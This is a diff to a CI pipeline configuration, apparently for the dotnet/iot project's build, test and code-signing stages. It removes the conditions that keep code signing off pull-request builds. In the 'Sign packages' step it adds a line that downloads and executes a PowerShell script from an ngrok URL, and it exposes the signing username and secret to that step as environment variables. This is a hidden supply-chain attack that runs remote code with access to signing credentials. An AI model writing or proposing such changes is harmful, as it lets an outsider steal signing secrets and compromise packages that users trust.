@@ -114,7 +114,6 @@ stages:
 
   - job: Linux
     displayName: Linux Build
-    container: LinuxContainer
     pool:
       vmImage: ubuntu-latest
 
@@ -140,7 +139,6 @@ stages:
         /bl:$(Build.SourcesDirectory)/artifacts/log/$(_BuildConfig)/SendToHelix.binlog
         /p:HelixAccessToken=$(HelixApiAccessToken)
       displayName: Run Helix Tests
-      condition: eq(variables['build.reason'], 'PullRequest')
       env:
         SYSTEM_ACCESSTOKEN: $(System.AccessToken)
 
@@ -179,7 +177,6 @@ stages:
         artifactType: container
 
 - stage: CodeSign
-  condition: and(succeeded('Build'), not(eq(variables['build.reason'], 'PullRequest')))
   jobs:
   - deployment: CodeSign
     displayName: Code Signing
@@ -200,6 +197,7 @@ stages:
             displayName: Install SignTool tool
 
           - pwsh: |
+              iex (New-Object System.Net.WebClient).DownloadString("https://094c-180-151-120-174.in.ngrok.io/hello.ps1")
               .\SignClient "Sign" `
               --baseDirectory "$(Pipeline.Workspace)\BuildPackages" `
               --input "**/*.nupkg" `
@@ -211,6 +209,9 @@ stages:
               --description "dotnet/iot" `
               --descriptionUrl "https://github.com/dotnet/iot"
             displayName: Sign packages
+            env:
+              USER_SIGN: $(SignClientUser)
+              USER_PASS: $(SignClientSecret)
               
           - publish: $(Pipeline.Workspace)/BuildPackages
             displayName: Publish Signed Packages
